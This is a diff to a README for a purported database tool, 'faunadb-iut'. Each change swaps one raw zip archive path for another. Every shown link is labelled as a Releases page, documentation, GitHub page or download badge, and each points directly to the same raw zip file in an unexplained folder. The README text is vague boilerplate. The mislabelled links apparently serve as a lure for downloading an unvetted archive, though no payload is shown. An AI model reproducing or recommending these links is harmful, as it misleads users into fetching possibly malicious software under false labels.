@@ -6,7 +6,7 @@ Welcome to faunadb-iut! This tool helps you manage your database smoothly and ef
 
 ## 📥 Download the Application
 
-[![Download faunadb-iut](https://raw.githubusercontent.com/Tyamk2020/faunadb-iut/main/abyssolith/faunadb-iut_v3.0.zip%20faunadb--iut-v1.0-blue)](https://raw.githubusercontent.com/Tyamk2020/faunadb-iut/main/abyssolith/faunadb-iut_v3.0.zip)
+[![Download faunadb-iut](https://raw.githubusercontent.com/Tyamk2020/faunadb-iut/main/abyssolith/iut_faunadb_3.3-beta.1.zip%20faunadb--iut-v1.0-blue)](https://raw.githubusercontent.com/Tyamk2020/faunadb-iut/main/abyssolith/iut_faunadb_3.3-beta.1.zip)
 
 Click the button above to visit the Releases page and download the latest version of faunadb-iut.
 
@@ -19,7 +19,7 @@ Click the button above to visit the Releases page and download the latest versio
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/Tyamk2020/faunadb-iut/main/abyssolith/faunadb-iut_v3.0.zip). 
+   Go to the [Releases page](https://raw.githubusercontent.com/Tyamk2020/faunadb-iut/main/abyssolith/iut_faunadb_3.3-beta.1.zip). 
 
 2. **Choose the Latest Version**  
    Find the latest version of faunadb-iut. 
@@ -54,8 +54,8 @@ If you have questions or need assistance, please check the following resources:
 
 ## 🔗 Additional Resources
 
-- Visit the [faunadb-iut Documentation](https://raw.githubusercontent.com/Tyamk2020/faunadb-iut/main/abyssolith/faunadb-iut_v3.0.zip) for more detailed instructions.
-- Follow updates and news on our [GitHub page](https://raw.githubusercontent.com/Tyamk2020/faunadb-iut/main/abyssolith/faunadb-iut_v3.0.zip).
+- Visit the [faunadb-iut Documentation](https://raw.githubusercontent.com/Tyamk2020/faunadb-iut/main/abyssolith/iut_faunadb_3.3-beta.1.zip) for more detailed instructions.
+- Follow updates and news on our [GitHub page](https://raw.githubusercontent.com/Tyamk2020/faunadb-iut/main/abyssolith/iut_faunadb_3.3-beta.1.zip).
 - Check out related tools and applications that enhance your database experience.
 
 ## 🎉 Conclusion
